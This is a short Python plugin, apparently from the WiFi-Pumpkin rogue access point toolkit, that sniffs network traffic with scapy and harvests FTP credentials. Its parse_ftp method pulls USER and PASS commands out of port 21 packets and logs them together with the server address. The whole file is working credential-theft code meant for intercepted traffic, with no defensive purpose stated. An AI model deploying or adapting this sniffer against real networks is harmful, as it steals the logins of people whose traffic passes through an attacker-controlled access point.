from scapy.all import *
from default import PSniffer

class ftp(PSniffer):
    ''' this script capture credentials of service ftp request HTTP '''
    _activated     = False
    _instance      = None

    meta = {
        'Name'      : 'ftp',
        'Version'   : '1.0',
        'Description' : 'capture credentials of service ftp request HTTP',
        'Author'    : 'Pumpkin-Dev',
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value

    @staticmethod
    def getInstance():
        if ftp._instance is None:
            ftp._instance = ftp()
        return ftp._instance

    def filterPackets(self,pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            self.src_ip = str(pkt[IP].src)
            self.dst_ip = str(pkt[IP].dst)
            self.load = pkt[Raw].load
            if self.dport == 21 or self.sport == 21:
                self.parse_ftp(self.load, self.dst_ip,self.src_ip)

    def parse_ftp(self,load,ip_dst,ip_src):
        load = repr(load)[1:-1].replace(r'\r\n', '')
        if 'USER ' in load:
            self.logging.info('[!] FTP User: {} SERVER: {}'.format(load,ip_dst))
        if 'PASS ' in load:
            self.logging.info('[!] FTP Pass: {} {}'.format(load,ip_dst))
        if 'authentication failed' in load:
            self.logging.info('[*] FTP authentication failed')
            self.logging.info(load)